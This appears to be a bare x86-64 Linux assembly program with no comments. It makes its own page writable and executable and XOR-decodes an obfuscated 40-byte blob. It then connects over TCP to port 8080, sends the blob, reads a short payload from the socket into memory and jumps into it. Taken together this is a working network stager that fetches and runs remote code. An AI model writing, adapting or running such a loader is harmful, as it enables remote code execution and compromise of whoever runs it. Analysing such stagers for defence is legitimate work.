	.section .text

	.globl _start

_start:
	addq	$0xffffffffffffffd0,%rsp
	movl	$0xa,%eax
	movl	$0x401000,%edi
	movl	$0x1000,%esi
	movl	$0x7,%edx
	syscall
	xorl	%ecx,%ecx
	jmp	.L0
.L1:
	movq	$0x401078,%r8
	addq	%rcx,%r8
	movb	(%r8),%r9b
	rolb	$4,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addl	$1,%ecx
.L0:
	cmpl	$0x28,%ecx
	jl	.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	test	%eax,%eax
	je	.L2
	movl	%eax,0x28(%rsp)
	xorq	%rax,%rax
	movq	%rax,0x10(%rsp)
	movq	%rax,0x18(%rsp)
	movw	$0x2,0x10(%rsp)
	movw	$0x901f,0x12(%rsp)
	movl	$0x2a,%eax
	movl	0x28(%rsp),%edi
	leaq	0x10(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	cmpl	$0xffffffff,%eax
	je	.L2
	movl	$1,%eax
	movl	0x28(%rsp),%edi
	movq	$0x401078,%rsi
	movl	$0x28,%edx
	syscall
	cmpl	$0x28,%eax
	jne	.L2
	movl	$0x7d,0x8(%rsp)
	movq	$0x401a00,(%rsp)
.L4:
	xorl	%eax,%eax
	movl	0x28(%rsp),%edi
	movq	(%rsp),%rsi
	movl	0x8(%rsp),%edx
	syscall
	addl	%eax,(%rsp)
	subl	%eax,0x8(%rsp)
	test	%eax,%eax
	jle 	.L3
	cmpl	$0,0x8(%rsp)
	jg	.L4
.L3:
	movl	$0x3,%eax
	movl	0x28(%rsp),%edi
	syscall
	movl	$0x401a4c,%eax
	call	*%rax
.L2:
	xorl	%edi,%edi
	addq	$0x30,%rsp
	movl	$0x3c,%eax
	syscall
